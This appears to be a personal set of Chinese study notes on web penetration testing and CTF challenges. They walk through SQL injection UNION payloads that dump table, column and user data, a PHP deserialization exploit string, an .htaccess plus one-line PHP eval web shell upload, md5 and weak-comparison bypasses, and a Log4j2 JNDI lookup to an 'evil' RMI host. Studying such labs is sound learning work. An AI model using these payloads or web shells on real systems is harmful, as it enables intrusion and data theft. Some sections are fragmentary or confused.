一般来讲分为三步，第一步是信息收集，第二步是





# sql注入

什么是sql注入？

首先，什么是sql？

SQL，Structured Query Language，结构化查询语言，是一种特定目的编程语言，用于管理`关系数据库管理系统`（RDBMS，Relational Database Management System），或在关系流数据管理系统（RDSMS）中进行流处理。

所以这就是SQL，在对数据库增删改查的过程中，我们经常用到。

关键点：`直接将用户输入拼接到SQL查询语句中`

这很好理解。这种一般都是字符拼接来构造sql语句。

最基本就是这种字符拼接的注入。

然后就是盲注blind injection，也就是看不同的构造导致的结果差异。比如页面不一样，返回数据不一样，响应时间不一样等等。

然后是高级语法注入：比如同时执行多条语句；比如利用注释；比如利用union；比如select嵌套select等等。

如何来检测呢？

首先就是手动的去尝试构造恶意的语句，看会有什么样的结果。

自动化的话，就是使用sqlmap。

手工测试

假设是数字型的

```
select * from user where id = {id}
```

id=1

```
select * from user where id = 1
```

正确，符合

id=1'

```
select * from user where id = 1'
```

报错，符合

假设是字符型的

```
select * from user where id = '{id}'
```

id=1，正确，符合

id=1'

变为

```
select * from user where id = '1''
```

报错，符合

所以到底是字符型的还是数字型的？

输入：id=1=1

数字型

```
select * from user where id = 1=1
```



## --+

在sql注入中常使用--+来代替--。防止--会被数据库过滤。

## 以sql-lab的第一题为例



## 摸索系统

如图，id等于1，返回正常

![image-20241212220740282](./Web%E6%B8%97%E9%80%8F.assets/image-20241212220740282.png)

确认为数字型注入

## 第一步

首先使用语句

```sql
1 order by 9999 --+
```

如果返回正确，那就是字符类型

如果返回错误，那就是数字类型

如图

![image-20241212220909651](./Web%E6%B8%97%E9%80%8F.assets/image-20241212220909651.png)

确认为字符型

## 判断注入点

？？？

## 第二步

确认类型后，查询列数。

```sql
1 order by 10 --+
```

pic

![image-20241212221937850](./Web%E6%B8%97%E9%80%8F.assets/image-20241212221937850.png)

说明没有10列

最后发现是3列

这说明，前面查询的结果包含三列（Column）。

然后我们只看到两个column的内容。我们要判断它们的位置。

这时候我们就让前面的语句为false

![image-20241212222245428](./Web%E6%B8%97%E9%80%8F.assets/image-20241212222245428.png)

确认回显点是2,3



## 查询出全部表名

```sql
group_concat(table_name) from information_schema.tables where table_schema=database()
```

构造的sql语句就是：

```sql
id=1' and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
```

pic

![image-20241212222529922](./Web%E6%B8%97%E9%80%8F.assets/image-20241212222529922.png)

知道了所有的表

## 查询出表的所有的列

pic

![image-20241212222904786](./Web%E6%B8%97%E9%80%8F.assets/image-20241212222904786.png)

语句如下：

```sql
group_concat(column_name) from information_schema.columns where table_name='users' --+
```



## 查询出表的某列（column）的所有数据



语句如下：

```sql
group_concat(username) from users --+
```

pic

![image-20241212223055622](./Web%E6%B8%97%E9%80%8F.assets/image-20241212223055622.png)





```sql
http://wangehacker.cn/sqli-labs/Less-2/?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+

```



那么最简单的这种sql注入

就是：确认是字符型还是数字型

确认column数目

确认回显点

union查询



## [极客大挑战 2019]LoveSQL

这道题基本上差不多

无非是多出来两个输入点

这道题要注意的两点：

一是hackerbar执行的不一定是表单提交后的，所以尽可能在表单里写内容提交

第二点是如果--+不能用的话，可以用#





## [极客大挑战 2019]Http

有许多http头可能我不知道不理解

所以要自己研究研究遇到的header



## [极客大挑战 2019]BabySQL



反正就是不停的过滤，输入



![image-20241213181601856](./Web%E6%B8%97%E9%80%8F.assets/image-20241213181601856.png)





## 第一步，目录扫描

内网的话使用nmap扫描，获取存活主机和主机开放端口信息。





## [极客大挑战 2019]PHP

这段 PHP 代码展示了一个通过反序列化漏洞进行攻击的示例。下面我会详细解释每个文件的功能以及它们如何相互作用。

### **`index.php` 文件**

```php
<?php
    include 'class.php';  // 引入 class.php 文件
    $select = $_GET['select'];  // 获取 URL 中的 'select' 参数
    $res = unserialize(@$select);  // 尝试反序列化 'select' 参数的值，使用 @ 符号来抑制错误
?>
```

- **`include 'class.php';`**: 这行代码包括了 `class.php` 文件，它定义了 `Name` 类。
- **`$select = $_GET['select'];`**: 通过 `$_GET` 获取 URL 中的 `select` 参数，通常这是一个序列化的字符串。
- **`$res = unserialize(@$select);`**: 将 URL 中的 `select` 参数值反序列化。`@` 符号用于抑制任何反序列化时的错误。`unserialize()` 函数会将反序列化后的对象赋值给 `$res` 变量。

### **`class.php` 文件**

```php
<?php
include 'flag.php';  // 引入 flag.php 文件，可能定义了一个包含敏感信息的变量（如标志）

error_reporting(0);  // 禁止显示错误报告，防止攻击者通过错误信息获得提示

class Name {
    private $username = 'nonono';  // 默认用户名
    private $password = 'yesyes';  // 默认密码

    // 构造函数，用于初始化用户名和密码
    public function __construct($username, $password) {
        $this->username = $username;
        $this->password = $password;
    }

    // 当对象被反序列化时，会调用 __wakeup 方法
    function __wakeup() {
        $this->username = 'guest';  // 将用户名设置为 'guest'
    }

    // 当对象销毁时，会调用 __destruct 方法
    function __destruct() {
        // 如果密码不等于 100，显示错误并终止
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "Your name is: ";
            echo $this->username;
            echo "</br>";
            echo "Your password is: ";
            echo $this->password;
            echo "</br>";
            die();  // 终止脚本执行
        }

        // 如果用户名是 'admin'，显示 flag（从 flag.php 引入）
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        } else {
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();  // 终止脚本执行
        }
    }
}
?>
```

#### 关键部分解释：

1. **`__construct($username, $password)`**:
   - 这是类的构造函数，用来初始化用户名和密码。初始化时，`username` 为 `'nonono'`，`password` 为 `'yesyes'`。
2. **`__wakeup()`**:
   - 当对象被反序列化时，`__wakeup` 方法会被自动调用。这里，`username` 会被重新设置为 `'guest'`。
3. **`__destruct()`**:
   - 当对象销毁时，`__destruct`方法会被调用。它做了两个事情：
     - 如果密码不等于 100，则会输出错误信息，并且显示当前的用户名和密码。
     - 如果用户名是 `'admin'`，则输出 `$flag` 变量的值（从 `flag.php` 引入的内容）。如果用户名不是 `'admin'`，则输出一个提示，表示不能获取 flag。

### **攻击分析**

这段代码的潜在问题在于**反序列化漏洞**。由于 `index.php` 中的 `unserialize()` 直接反序列化了 `select` 参数的值，攻击者可以通过修改 `select` 参数来控制 `Name` 类的对象的属性值。

#### 攻击步骤：

1. **构造恶意 `select` 参数**: 攻击者可以构造一个包含 `Name` 对象的序列化字符串，注入到 `select` 参数中。例如：

   ```php
   $payload = serialize(new Name("admin", 100));
   ```

2. **反序列化时执行 `__wakeup()` 和 `__destruct()`**: 当 `index.php` 反序列化该字符串时，会创建一个 `Name` 对象，并自动调用 `__wakeup()` 方法，设置 `username` 为 `'guest'`。然后，在对象销毁时，`__destruct()` 会被调用。

   如果用户名是 `'admin'` 且密码是 `100`，`__destruct()` 会输出 flag 内容。

3. **获得 flag**: 如果构造的对象的用户名是 `'admin'` 且密码是 `100`，则攻击者可以获取 `$flag` 变量的值，显示敏感信息。

### 总结

这段代码存在反序列化漏洞，攻击者可以通过构造特定的序列化数据，注入恶意的 `Name` 对象，并通过触发 `__destruct()` 来泄露 flag 或其他敏感信息。为了防止此类攻击，应该避免直接反序列化用户输入，或者使用更加安全的反序列化方法，如加入输入验证、使用 `json_decode()` 或 `json_encode()` 代替 `unserialize()` 等。



这个是反序列化的

正确的exp，%22是url编码的双引号。前边这个3说明属性数量是3个，和里边的2个不一样。

```
?select=O:4:%22Name%22:3:{s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;}
```







```php
<?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?> 
```

## [极客大挑战 2019]BuyFlag

## postman+burpsuit还是很方便的

这题的考点是php的弱比较

关键代码如下

```php
<!--
	~~~post money and password~~~
if (isset($_POST['password'])) {
	$password = $_POST['password'];
	if (is_numeric($password)) {
		echo "password can't be number</br>";
	}elseif ($password == 404) {
		echo "Password Right!</br>";
	}
}
-->
```



## [HCTF 2018]admin

逆天题目

要仔细看页面源代码

然后找到一个项目

然后分析这个flask项目

发现是伪造cookie

## [MRCTF2020]你传你🐎呢

文件上传新花样

先上传.htaccess文件

.htaccess

```
AddType application/x-httpd-php .png
```

然后上传muma.png文件

muma.png

```
<?php @eval($_POST['shell']);?>
```

让png都按照php解析



## [护网杯 2018]easy_tornado

首先知道是tornado这个东西

然后再error界面传入参数：

![image-20241214155250143](./Web%E6%B8%97%E9%80%8F.assets/image-20241214155250143.png)



拿到cookie

然后md5加密即可

关键是理解tornado，拿到cookie

虽然我不理解？？？？



## [ZJCTF 2019]NiZhuanSiWei

三个参数

第一个使用data协议来读取文件

第二个使用filter来转化成base64读取

第三个就是反序列化，直接将序列化内容输入即可



## [MRCTF2020]Ez_bypass

源码

```php
<?php
include 'flag.php';
$flag = 'MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';

if (isset($_GET['gg']) && isset($_GET['id'])) {
    $id = $_GET['id'];
    $gg = $_GET['gg'];
    
    if (md5($id) === md5($gg) && $id !== $gg) {
        echo 'You got the first step';
        
        if (isset($_POST['passwd'])) {
            $passwd = $_POST['passwd'];
            
            if (!is_numeric($passwd)) {
                if ($passwd == 1234567) {
                    echo 'Good Job!';
                    highlight_file('flag.php');
                    die('By Retr_0');
                } else {
                    echo "Can you think twice??";
                }
            } else {
                echo 'You cannot get it!';
            }
        } else {
            die('Only one way to get the flag');
        }
    } else {
        die('Please input first');
    }
} else {
    echo "You are not a real hacker!";
}
?>

```



md5碰撞

弱比较



# JAVA漏洞



## Log4j2

JNDI，英文是：Java Naming and Directory Interface

![image-20241215151613403](./Web%E6%B8%97%E9%80%8F.assets/image-20241215151613403.png)



RMI（Remote Method Invocation）

log4j2在执行的时候，会扫描占位符，比如`${}`，然后`lookup`机制开始启动。

**查找提供器**：Log4j2 会使用一组查找提供器来查找占位符对应的值。查找提供器可以包括：

- `SystemPropertyLookup`（查找系统属性）
- `EnvLookup`（查找环境变量）
- `JndiLookup`（查找 JNDI）
- 其他用户定义的查找器

**调用 `lookup` 方法**：对于 JNDI 查找，例如 `${jndi:rmi://localhost:1099/evil}`，Log4j2 会调用 JNDI API（通过 `JndiManager`）来执行查找。具体来说，Log4j2 会在 `JndiLookup` 中执行 `lookup` 方法，该方法会查询远程 RMI 服务器，解析出一个对象，并将其返回。

基本上这是漏洞成因。



## fastjson

反序列化漏洞



## shiro



## struts2





## HTTPS/TLS

TLS，Transport Layer Security，前身是SSL，Secure Sockets Layer

TLS握手过程：

1. client给server发送自己的TLS相关信息
2. server返回给client相关的TLS信息，以及自己的CA证书
3. client用自带的CA证书公钥来解密server的CA，获取CA里的server公钥。然后用server公钥将client的预主密钥加密，发送给server。
4. client根据预主密钥生成回话秘钥。
5. server接收到client发送的内容后，用server的私钥进行解密，获取到client的预主密钥。
6. server根据预主密钥生成回话秘钥。
7. client和server按照这个秘钥，进行对称加密，发送信息通信。



## NAT

也就是private转化为public

只有公网ip才能访问公网内容。私网不行，所以私网要转化为公网。







## 递归查询和迭代查询

递归查询，英文是：Recursive Query

迭代查询，英文是：Iterative Query

代码示例：

```python
tree = {
    "value": 5,
    "children": [
        {"value": 3, "children": []},
        {"value": 8, "children": [
            {"value": 2, "children": []},
            {"value": 4, "children": []}
        ]}
    ]
}


def sum_recursive(node):
    if not node:
        return 0
    total = node['value']
    for child in node['children']:
        total += sum_recursive(child)
    return total


def sum_iterative(node):
    if not node:
        return 0
    stack = [node]
    total = 0
    while stack:
        current = stack.pop()
        total += current['value']
        # Add children to stack
        stack.extend(current['children'])  
    return total


# Test the iterative function
print("Iterative sum:", sum_iterative(tree))  # Output: 22


# Test the recursive function
print("Recursive sum:", sum_recursive(tree))  # Output: 22

```



## 前序遍历



## 后序遍历



## 层序遍历



## CSRF



## SSRF



## XSS



## XXE



## 反序列化

## 渗透测试流程

找到网站

测试功能

漏洞扫描

漏洞利用

获取后台

权限提升

内网渗透





## 蜜罐

